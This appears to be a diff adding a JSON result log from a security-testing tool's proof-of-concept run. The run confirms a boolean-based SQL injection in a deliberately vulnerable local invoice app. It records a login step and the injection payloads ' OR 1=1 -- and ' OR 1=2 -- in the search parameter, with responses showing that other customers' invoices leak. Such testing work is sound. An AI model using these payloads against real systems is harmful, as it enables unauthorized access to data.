@@ -1,0 +1,93 @@
+{
+  "tool": "run_poc",
+  "version": "1.0.0",
+  "finding": "F-5",
+  "poc_file": "sqli-search.json",
+  "target": "http://127.0.0.1:5057",
+  "permission": "Example run: the skill's author started the deliberately vulnerable sample app on 127.0.0.1:5057 for this run and allowed safe PoCs against it",
+  "allow_hosts": [],
+  "started_at": "2026-11-10T04:26:51Z",
+  "finished_at": "2026-11-10T04:26:51Z",
+  "safety": {
+    "checked": true,
+    "issues": []
+  },
+  "steps": [
+    {
+      "name": "login as alice",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:5057/login",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "email=alice%40example.test&password=alice-test-pw"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "205",
+          "Location": "/invoices",
+          "Set-Cookie": "session=<redacted>; HttpOnly; Path=/"
+        },
+        "body_excerpt": "<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href=\"/invoices\">/invoices</a>. If not, click the link.\n",
+        "body_length": 205,
+        "elapsed_ms": 526
+      },
+      "expect_status_met": true
+    },
+    {
+      "name": "true condition",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:5057/invoices/search?q=%27+OR+1%3D1+--",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "application/json",
+          "Content-Length": "340"
+        },
+        "body_excerpt": "[{\"amount\":1200.0,\"customer\":\"Acme Pty Ltd\",\"id\":1,\"number\":\"INV-1001\",\"status\":\"sent\"},{\"amount\":450.5,\"customer\":\"Globex\",\"id\":2,\"number\":\"INV-1002\",\"status\":\"paid\"},{\"amount\":990.0,\"customer\":\"Initech\",\"id\":3,\"number\":\"INV-2001\",\"status\":\"sent\"},{\"amount\":15000.0,\"customer\":\"Umbrella Corp\",\"id\":4,\"number\":\"INV-2002\",\"status\":\"draft\"}]\n",
+        "body_length": 340,
+        "elapsed_ms": 3
+      },
+      "expect_status_met": null
+    },
+    {
+      "name": "false condition",
+      "request": {
+        "method": "GET",
+        "url": "http://127.0.0.1:5057/invoices/search?q=%27+OR+1%3D2+--",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "application/json",
+          "Content-Length": "169"
+        },
+        "body_excerpt": "[{\"amount\":1200.0,\"customer\":\"Acme Pty Ltd\",\"id\":1,\"number\":\"INV-1001\",\"status\":\"sent\"},{\"amount\":450.5,\"customer\":\"Globex\",\"id\":2,\"number\":\"INV-1002\",\"status\":\"paid\"}]\n",
+        "body_length": 169,
+        "elapsed_ms": 2
+      },
+      "expect_status_met": null
+    }
+  ],
+  "proof": {
+    "type": "boolean_diff",
+    "true_step": "true condition",
+    "false_step": "false condition",
+    "marker": "INV-2001",
+    "passed": true,
+    "observed": "marker in true-condition response: True; in false-condition response: False"
+  },
+  "result": "confirmed"
+}
